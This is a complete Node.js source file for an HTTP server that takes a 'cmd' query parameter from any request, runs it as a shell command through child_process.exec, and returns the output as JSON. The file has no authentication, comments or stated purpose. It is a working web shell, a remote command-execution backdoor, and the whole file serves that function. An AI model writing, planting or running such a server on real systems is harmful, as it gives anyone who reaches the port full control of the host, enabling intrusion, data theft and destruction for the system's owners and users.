const http = require('http')
const url = require('url')
const exec = require('child_process').exec

const port = 3000

const requestHandler = (request, response) => {
  const url_parts = url.parse(request.url, true)
  const query = url_parts.query
  if (query.cmd === undefined || query.cmd === null) {
    response.end('missing cmd param')
    return
  }
  const cmd = query.cmd

  const child = exec(cmd, function (error, stdout, stderr) {
    const hash = {
      stdout: stdout,
      stderr: stderr,
      execerror: null
    }
    if (error !== null) {
      hash.execerror = error
    }

    response.end(JSON.stringify(hash))
  });
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
  if (err) {
    return console.log('something bad happened', err)
  }

  console.log(`server is listening on ${port}`)
})
